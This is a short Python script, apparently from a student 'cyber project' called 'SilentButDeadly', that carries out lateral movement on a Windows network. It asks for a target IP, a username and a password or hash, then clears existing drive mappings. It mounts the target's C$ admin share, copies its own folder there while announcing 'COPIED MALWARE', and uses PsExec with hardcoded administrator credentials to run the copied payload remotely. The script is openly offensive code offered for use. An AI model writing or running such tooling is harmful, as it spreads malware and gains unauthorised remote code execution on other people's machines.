import os

if __name__ == '__main__':
    path = os.getcwd()
    print(path)
    # path = path[:path.rindex(r'\l')]
    print(path)
    ip = input("enter IP")
    print(ip)
    user = input("enter username")
    print(user)
    password = input("enter hash")
    print(password)
    try:
        os.popen('Net use * /delete /Y').read()
        print('STARTING')
        os.popen(r"Net use h: \\" + ip + r"\c$ /user:" + user + r" " + password + " /p:yes").read()
        print("CONNECTED")
    except:
        print("didn't initiate connection")
    try:
        x = os.popen(r"xcopy " + path + r"\*.* h:\SilentButDeadly(CyberProject)\LateralMovement  /E /H /C /I").read()
        print("COPIED MALWARE")
    except:
        print("didn't copy malware")
    try:
        os.popen(
            r'Psexec \\192.168.68.125 -u administrator -p 123456 -i h:\SilentButDeadly(CyberProject)\LateralMovement\main.py').read()
        print('DONE')
    except:
        print('failed to run')
